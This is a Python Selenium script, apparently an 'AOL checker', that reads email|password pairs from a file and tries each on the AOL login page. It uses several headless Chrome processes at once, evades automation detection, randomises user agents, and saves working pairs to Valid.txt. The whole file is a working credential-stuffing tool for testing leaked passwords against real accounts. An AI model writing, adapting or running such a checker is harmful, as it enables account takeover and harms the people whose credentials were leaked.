from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait as wait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
import os
import random
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import Select
from multiprocessing import Pool
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from faker import Faker
 
fake = Faker()
cwd = os.getcwd()

opts = Options()
opts.headless = True
opts.add_argument('log-level=3') 
dc = DesiredCapabilities.CHROME
dc['loggingPrefs'] = {'driver': 'OFF', 'server': 'OFF', 'browser': 'OFF'}
opts.add_argument('--ignore-ssl-errors=yes')
opts.add_argument("--start-maximized")

opts.add_argument('--ignore-certificate-errors')
opts.add_argument('--disable-blink-features=AutomationControlled')
opts.add_experimental_option('excludeSwitches', ['enable-logging'])
path_browser = f"{cwd}\chromedriver.exe"

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

    def disable(self):
        self.HEADER = ''
        self.OKBLUE = ''
        self.OKGREEN = ''
        self.WARNING = ''
        self.FAIL = ''
        self.ENDC = ''
 
def open_browser(k):
    k =  k.split("|")
    email = k[0]
    password = k[1]
    random_angka = random.randint(100,999)
    random_angka_dua = random.randint(10,99)
    opts.add_argument(f"user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.{random_angka}.{random_angka_dua} Safari/537.36")
    browser = webdriver.Chrome(options=opts, desired_capabilities=dc, executable_path=path_browser)
    browser.get('https://login.aol.com')
 
    try:
        fill_email = wait(browser,25).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="login-username"]')))
        fill_email.send_keys(email)
        
        sleep(0.5)
        fill_email.send_keys(Keys.ENTER)
        try:
            fill_password = wait(browser,5).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="login-passwd"]')))
            fill_password.send_keys(password)
            
            sleep(0.5)
            fill_password.send_keys(Keys.ENTER)
             
            if "login" in browser.current_url:
                print(f"{bcolors.FAIL}[X] [ {email} ] NOT VALID")
                with open('nonValid.txt','a') as f:
                    f.write('{0}|{1}\n'.format(email,password))
                browser.quit()
            else:
                print(f"{bcolors.OKGREEN}[+] [ {email} ] VALID")
                with open('Valid.txt','a') as f:
                    f.write('{0}|{1}\n'.format(email,password))
                browser.quit()
        except:
            print(f"{bcolors.FAIL}[X] [ {email} ] NOT VALID")
       
            with open('nonValid.txt','a') as f:
                f.write('{0}|{1}\n'.format(email,password))
            browser.quit()
    except:
        print(f"{bcolors.FAIL}[X] [ {email} ] NOT VALID")
     
        with open('nonValid.txt','a') as f:
            f.write('{0}|{1}\n'.format(email,password))
        browser.quit()

if __name__ == '__main__':
     
    print(f'{bcolors.OKCYAN}[*] Automation Checker AOL')
  
    jumlah = int(input(f"{bcolors.OKCYAN}[*] Multi Processing: "))
    print('[*] Start...')
    file_list_akun = "daftar_akun.txt"
    myfile_akun = open(f"{cwd}/{file_list_akun}","r")
    akun = myfile_akun.read()
    list_accountsplit = akun.split("\n")
    k = list_accountsplit
    try:
        with Pool(jumlah) as p:  
            p.map(open_browser, k)
            p.join()
            print('[*] Automation Complete')
    except:
        print('[*] Automation Complete')
